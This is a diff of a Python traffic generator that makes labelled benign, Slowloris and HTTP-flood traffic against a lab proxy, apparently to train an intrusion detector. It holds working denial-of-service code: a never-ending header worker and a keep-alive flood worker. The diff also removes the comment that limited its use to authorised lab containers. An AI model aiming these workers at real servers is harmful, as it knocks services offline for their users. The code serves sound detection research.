@@ -1,105 +1,36 @@
 #!/usr/bin/env python3
-"""
-generate.py — produce labelled traffic, with ground truth from the generator.
-
-WHY WE GENERATE INSTEAD OF ONLY USING CIC-IDS2017
---------------------------------------------------
-The public dataset cannot support this project, for three reasons that are
-documented rather than guessed:
-
-  1. The only two DoS attacks that actually worked in CIC-IDS2017 were
-     Slowloris and SlowHTTPtest — BOTH slow. There is no working flood in it.
-     Hulk was mis-implemented (it needs HTTP keep-alive; all recorded Hulk
-     traffic used `Connection: close`), so it behaves like browsing.
-     Result: training only on CIC-IDS2017 means the flood branch of the
-     mechanism switch has nothing to learn from.
-
-  2. Its 85 CICFlowMeter columns do not map onto our FlowRecord. Every join
-     is a hand-written translation, and the features that matter most for slow
-     attacks (is the header complete? has the declared body arrived?) are not
-     among them.
-
-  3. Its labels come from the attacker's intent, not from measured behaviour.
-
-Generating our own fixes all three at once:
-  * every attack class we need, including a working flood
-  * features come from our own sensor, so there is no column translation
-  * the label is the SOURCE CONTAINER, so labelling is exact and free
-
-CIC-IDS2017 is still used, for the dataset audit and as a secondary check.
-
-GROUND TRUTH BY CONTAINER
--------------------------
-Each generator runs in its own container with its own IP. The capture is on
-the proxy's interface, so we can label by source IP:
-
-    legit-loadgen  -> benign
-    slow-gen       -> slowloris
-    flood-gen      -> flood
-
-That label is objective. No heuristics, no manual annotation.
-
-AUTHORISATION: run only against containers you control, with the signed
-authorisation sheet in the repo. Never against anything you do not own.
-"""
 from __future__ import annotations
-
 import argparse
 import asyncio
 import random
 import time
 
-# Targets are resolved by container name on the lab network.
 LAB_HOST = "proxy"
 LAB_PORT = 80
-
-# Source IPs this container may bind to (one per worker). Empty = bind nothing
-# (kernel picks the primary IP). Populated from --ip-base/--ip-count.
-#
-# WHY: with a single source IP per container, every worker shares one entity, so
-# the model's per-entity features (concurrency, etc.) collapse all workers into
-# one client and can leak IP identity. Binding each worker to its own IP makes
-# "one client = one IP" true, which is how the real world looks.
 SRC_IPS: list[str] = []
 
-
+# Opens a TCP connection, optionally pinned to a specific source IP.
 async def _connect(src_ip: str | None = None):
-    """Open a TCP connection, optionally pinned to a specific source IP."""
     if src_ip:
         return await asyncio.open_connection(
             LAB_HOST, LAB_PORT, local_addr=(src_ip, 0))
     return await asyncio.open_connection(LAB_HOST, LAB_PORT)
 
-
+# Builds the ground-truth header embedded in every request for per-flow labelling.
 def _gt_header(gt_label: str) -> bytes:
-    """Ground-truth header embedded in every request so the sensor can label
-    per-flow without relying on source IP. The model never sees this header."""
     return f"X-Ground-Truth: {gt_label}\r\n".encode()
 
-
-# ---------------------------------------------------------------------------
-# BENIGN — must look realistic, including the awkward cases
-# ---------------------------------------------------------------------------
+# Simulates a realistic browser session with reconnects and slow but finite uploads.
 async def benign_worker(agent: int, duration: int, think_lo: float,
                         think_hi: float, slow_fraction: float = 0.15,
                         stagger: float = 0.0, src_ip: str | None = None,
                         stats: dict | None = None):
-    """A realistic browser session.
-
-    Reconnects periodically. A browser does NOT hold one socket open for the
-    whole run, and one-socket-per-agent would create every benign flow at t=0 —
-    which breaks any time-based train/val split (all benign would land in train).
-
-    slow_fraction deliberately produces SLOW BUT FINITE requests: a user on a
-    bad connection who takes 8 seconds to upload a 2 MB form. This is the hard
-    negative. Without it, the stall detector will flag every large upload and
-    the false-positive rate in the report will be fiction.
-    """
     if stats is None:
         stats = {"connections_attempted": 0, "connections_succeeded": 0,
                  "connections_failed": 0, "requests_attempted": 0,
                  "requests_completed": 0, "requests_failed": 0,
                  "exceptions": []}
+        
     if stagger > 0:
         await asyncio.sleep(random.uniform(0.0, stagger))
     end = time.time() + duration
@@ -107,7 +38,6 @@ async def benign_worker(agent: int, duration: int, think_lo: float,
     gt_header = _gt_header("benign")
 
     while time.time() < end:
-        # Connection attempt
         stats["connections_attempted"] = stats.get("connections_attempted", 0) + 1
         try:
             reader, writer = await _connect(src_ip)
@@ -115,27 +45,23 @@ async def benign_worker(agent: int, duration: int, think_lo: float,
         except Exception as e:
             stats["connections_failed"] = stats.get("connections_failed", 0) + 1
             stats["exceptions"].append(f"agent={agent} connect: {type(e).__name__}: {e}")
-            await asyncio.sleep(1.0)  # Back off before retry
+            await asyncio.sleep(1.0)
             continue
-
         for _ in range(random.randint(1, 3)):
             if time.time() >= end:
                 break
             slow = random.random() < slow_fraction
             body_len = (random.randint(200_000, 2_000_000) if slow
                         else random.randint(0, 4000))
-
             head = (f"POST /api/form/{uid} HTTP/1.1\r\n"
                     f"Host: api\r\n"
                     f"User-Agent: Mozilla/5.0 ({uid})\r\n"
                     f"Content-Length: {body_len}\r\n"
                     f"Content-Type: multipart/form-data\r\n").encode()
             head += gt_header + b"\r\n"
-
             stats["requests_attempted"] = stats.get("requests_attempted", 0) + 1
             try:
                 if slow:
-                    # the nasty case: a genuinely slow client that DOES finish
                     writer.write(head)
                     await writer.drain()
                     chunk = b"x" * 8192
@@ -154,27 +80,22 @@ async def benign_worker(agent: int, duration: int, think_lo: float,
                     body = b"x" * body_len if body_len else b""
                     writer.write(head + body)
                     await writer.drain()
-
-                # read the response so keep-alive stays alive
                 try:
                     await asyncio.wait_for(reader.read(4096), timeout=30)
                 except asyncio.TimeoutError:
                     stats["exceptions"].append(f"agent={agent} response_read_timeout")
                     pass
-
                 stats["requests_completed"] = stats.get("requests_completed", 0) + 1
             except ConnectionResetError as e:
                 stats["requests_failed"] = stats.get("requests_failed", 0) + 1
                 if "send_body" not in stats["exceptions"][-1] if stats["exceptions"] else True:
                     stats["exceptions"].append(f"agent={agent} request: ConnectionResetError: {e}")
-                break  # Abort this connection on request failure
+                break
             except Exception as e:
                 stats["requests_failed"] = stats.get("requests_failed", 0) + 1
                 stats["exceptions"].append(f"agent={agent} request: {type(e).__name__}: {e}")
-                break  # Abort this connection on request failure
-
+                break
             await asyncio.sleep(random.uniform(think_lo, think_hi))
-
         writer.close()
         try:
             await writer.wait_closed()
@@ -183,24 +104,10 @@ async def benign_worker(agent: int, duration: int, think_lo: float,
         await asyncio.sleep(random.uniform(0.05, 0.4))
 
 
-# ---------------------------------------------------------------------------
-# SLOWLORIS — header never terminates, connection never closes
-# ---------------------------------------------------------------------------
+# Simulates a Slowloris attack that never terminates its HTTP header.
 async def slowloris_worker(conn_id: int, duration: int,
                            keepalive_interval: float = 1.0,
                            stagger: float = 0.0, src_ip: str | None = None):
-    """Open a connection and send an HTTP header that NEVER terminates.
-
-    The header is missing its terminating blank line (the final CRLF CRLF), so
-    the request is never complete and the server must hold a worker slot. Extra
-    header lines are dribbled periodically so the connection stays open for the
-    whole run instead of hitting the server's header timeout.
-
-    This is what Slowloris actually is: many long-held, never-finishing
-    requests. Sending the blank line (as an earlier version did) turns this into
-    a normal request followed by an idle keep-alive socket — a different attack,
-    and not what the header_complete / stall features are meant to capture.
-    """
     if stagger > 0:
         await asyncio.sleep(random.uniform(0.0, stagger))
     end = time.time() + duration
@@ -208,13 +115,11 @@ async def slowloris_worker(conn_id: int, duration: int,
         return
     reader, writer = await _connect(src_ip)
     gt_header = _gt_header("slow")
-    # NOTE: ends with a single CRLF — the terminating blank line is omitted.
     writer.write(f"GET /api/search?q={'y' * 70}&u={conn_id} HTTP/1.1\r\n"
                  f"Host: api\r\nUser-Agent: curl/7.81.0\r\n".encode())
-    writer.write(gt_header)  # gt_header already ends with \r\n; NO extra \r\n -> header never completes
+    writer.write(gt_header)
     await writer.drain()
 
-    # keep the header open: dribble a harmless header line, still no blank line
     while time.time() < end:
         writer.write(f"X-keepalive: {random.randint(1, 99999)}\r\n".encode())
         await writer.drain()
@@ -223,19 +128,9 @@ async def slowloris_worker(conn_id: int, duration: int,
     writer.close()
 
 
-
-# ---------------------------------------------------------------------------
-# FLOOD — high rate, keep-alive, every request complete
-# ---------------------------------------------------------------------------
+# Simulates a high-rate HTTP flood using keep-alive connections.
 async def flood_worker(conn_id: int, duration: int, req_per_conn: int = 200,
                        stagger: float = 0.0, src_ip: str | None = None):
-    """A working HTTP flood.
-
-    Keep-alive is used deliberately. With `Connection: close` each request costs
-    a fresh TCP handshake, which throttles the attack to the handshake rate —
-    that is the bug that made Hulk ineffective in CIC-IDS2017. Reusing the
-    connection is what lets one connection sustain thousands of requests/sec.
-    """
     if stagger > 0:
         await asyncio.sleep(random.uniform(0.0, stagger))
     end = time.time() + duration
@@ -256,37 +151,19 @@ async def flood_worker(conn_id: int, duration: int, req_per_conn: int = 200,
             await asyncio.wait_for(reader.read(65536), timeout=2)
         except asyncio.TimeoutError:
             pass
-        # Pace bursts (nginx answers instantly on a LAN, so without this the
-        # loop runs at TCP-drain speed and the pcap balloons; a steady ~20
-        # bursts/s per worker is still a high-rate flood vs benign ~1 req/s).
         await asyncio.sleep(random.uniform(0.03, 0.06))
     writer.close()
 
-
-# ---------------------------------------------------------------------------
-# Orchestration
-# ---------------------------------------------------------------------------
+# Picks this worker's source IP from the container's pool.
 def _ip_for(i: int) -> str | None:
-    """Pick this worker's source IP from the container's pool (if any)."""
     if not SRC_IPS:
         return None
     return SRC_IPS[i % len(SRC_IPS)]
 
-
+# Runs benign, slowloris, and flood workers from this container.
 async def run_mix(duration: int, n_benign: int, n_slow: int, n_flood: int,
                   label: str, stagger: float | None = None,
                   req_per_conn: int = 200):
-    """Run the requested attack workers from THIS container.
-
-    n_benign exists for completeness but must stay 0 in attack containers:
-    flows are labelled by source container IP, so benign traffic sent from an
-    attack container would be mislabelled. Run legit-loadgen concurrently for
-    benign load.
-
-    stagger spreads connection start times across the run so flows are not all
-    created at t=0 (a chronological train/val split needs both classes spread
-    over time).
-    """
     if stagger is None:
         stagger = duration * 0.6
     tasks = []
@@ -299,19 +176,13 @@ async def run_mix(duration: int, n_benign: int, n_slow: int, n_flood: int,
     for i in range(n_flood):
         tasks.append(flood_worker(i, duration, req_per_conn=req_per_conn,
                                   stagger=stagger, src_ip=_ip_for(i)))
-
     print(f"[{label}] {n_benign} benign + {n_slow} slowloris + "
           f"{n_flood} flood, for {duration}s")
     await asyncio.gather(*tasks, return_exceptions=True)
 
-
+# Runs a benign-only traffic generation to measure false-positive rate.
 async def run_benign_only(duration: int, n_benign: int, label: str,
                           stagger: float | None = None):
-    """Benign-only run. THIS is the run that produces the false-positive rate.
-
-    Measure every trigger's FPR here. Tuning thresholds on traffic that
-    contains attacks guarantees a flattering and meaningless number.
-    """
     if stagger is None:
         stagger = duration * 0.6
     stats_list = [{"connections_attempted": 0, "connections_succeeded": 0,
@@ -325,7 +196,6 @@ async def run_benign_only(duration: int, n_benign: int, label: str,
           f"(this run gives the FPR)")
     await asyncio.gather(*tasks, return_exceptions=True)
 
-    # Aggregate and print stats
     total = {"connections_attempted": 0, "connections_succeeded": 0,
              "connections_failed": 0, "requests_attempted": 0,
              "requests_completed": 0, "requests_failed": 0,
@@ -341,64 +211,42 @@ async def run_benign_only(duration: int, n_benign: int, label: str,
           f"failed={total['requests_failed']}")
     if total["exceptions"]:
         print(f"[{label}] EXCEPTIONS ({len(total['exceptions'])}):")
-        for exc in total["exceptions"][:10]:  # Print first 10
+        for exc in total["exceptions"][:10]:
             print(f"  {exc}")
         if len(total["exceptions"]) > 10:
             print(f"  ... and {len(total['exceptions']) - 10} more")
 
-
-# ---------------------------------------------------------------------------
-# MIXED — real-world hosts do not stay in one lane. One source IP may browse
-# like a normal user and later turn attacker (or the reverse), or do both at
-# once. Labels stay PER-FLOW because every request still carries its own
-# X-Ground-Truth header, so a mixed IP is labelled correctly flow by flow.
-# ---------------------------------------------------------------------------
 MIXED_PROFILES = [
-    "benign_only",             # innocent user — never attacks
-    "slow_only",               # pure slowloris bot
-    "flood_only",              # pure flood bot
-    "benign_then_slow",        # real work, then turns slowloris (compromised host)
-    "benign_then_flood",       # real work, then floods
-    "slow_then_benign",        # attacks, then goes quiet/innocent
-    "flood_then_benign",       # flood stops, host looks normal again
-    "benign_concurrent_slow",  # browsing WHILE holding slowloris sockets
-    "slow_and_flood",          # dual-technique bot
+    "benign_only",
+    "slow_only",
+    "flood_only",
+    "benign_then_slow",
+    "benign_then_flood",
+    "slow_then_benign",
+    "flood_then_benign",
+    "benign_concurrent_slow",
+    "slow_and_flood",
 ]
 
-
+# Runs one worker phase with a timeout so it cannot hang the whole IP.
 async def _bounded(coro, timeout: float):
-    """Await one worker phase but never let it hang or abort the whole IP.
-
-    A ConnectionResetError, a stalled drain() or a timeout in one phase must
-    NOT stop the other phase of the same profile -- that bug silently killed
-    every benign->attack example in the first mixed capture, because the two
-    phases were sequenced with `await a; await b` and `a` raised / hung.
-    """
     try:
         return await asyncio.wait_for(coro, timeout=timeout)
     except Exception:
         return None
 
-
+# Sleeps for a delay then runs a coroutine.
 async def _after(delay: float, coro):
     if delay > 0:
         await asyncio.sleep(delay)
     return await coro
 
-
+# Runs one source IP through a real-world attack profile.
 async def mixed_ip_worker(i: int, profile: str, duration: int,
                           req_per_conn: int = 50, src_ip: str | None = None):
-    """One source IP plays one real-world profile.
-
-    Phased profiles run their two halves on the SAME IP: phase B is scheduled
-    with a time offset and gathered CONCURRENTLY with phase A, so a reset or
-    stall in one half can never prevent the other half from running. Every
-    phase is time-bounded so a stalled socket cannot keep the generator alive.
-    The per-request X-Ground-Truth header keeps the labelling exact per flow.
-    """
     half = max(1, duration // 2)
-    span = duration + 15      # hard cap for a full-length phase
-    hspan = half + 15         # hard cap for a half-length phase
+    span = duration + 15
+    hspan = half + 15
 
     def ben(dur, stagger):
         return _bounded(benign_worker(i, dur, 0.2, 2.0, stagger=stagger,
@@ -432,9 +280,8 @@ async def mixed_ip_worker(i: int, profile: str, duration: int,
         raise ValueError(f"unknown mixed profile: {profile}")
 
 
+# Runs N source IPs through mixed profiles in round-robin order.
 async def run_mixed(duration: int, n_ips: int, label: str, req_per_conn: int = 50):
-    """N source IPs, each playing a profile from MIXED_PROFILES in round-robin,
-    so every profile appears and the whole spread is covered."""
     tasks = [mixed_ip_worker(i, MIXED_PROFILES[i % len(MIXED_PROFILES)],
                              duration, req_per_conn=req_per_conn, src_ip=_ip_for(i))
              for i in range(n_ips)]
@@ -442,7 +289,7 @@ async def run_mixed(duration: int, n_ips: int, label: str, req_per_conn: int = 5
           f"{duration}s (per-flow labels via X-Ground-Truth)")
     await asyncio.gather(*tasks, return_exceptions=True)
 
-
+# Parses CLI args and dispatches to the selected traffic generation mode.
 def main() -> None:
     ap = argparse.ArgumentParser(
         description="Generate labelled L7 attack traffic against the lab proxy")
@@ -470,11 +317,6 @@ def main() -> None:
         SRC_IPS = [f"{args.ip_base}.{i}" for i in range(1, args.ip_count + 1)]
         print(f"source IP pool: {SRC_IPS[0]} .. {SRC_IPS[-1]} "
               f"({len(SRC_IPS)} IPs)")
-
-    # IMPORTANT: an attack container must emit ONLY attack traffic.
-    # The label is the source container IP, so any benign flow sent from
-    # slow-gen/flood-gen would be recorded with y=1 (mislabelled). Benign load
-    # is produced by legit-loadgen only, run at the same time for realism.
     if args.mode == "benign":
         asyncio.run(run_benign_only(args.duration, args.benign, args.label))
     elif args.mode == "slow":
@@ -485,10 +327,9 @@ def main() -> None:
     elif args.mode == "mixed":
         asyncio.run(run_mixed(args.duration, args.mixed, args.label,
                               req_per_conn=args.req_per_conn))
-    else:  # mix: all three attacks from this one attack container
+    else:
         asyncio.run(run_mix(args.duration, 0, args.slow, args.flood,
                             args.label))
-
 
 if __name__ == "__main__":
     main()
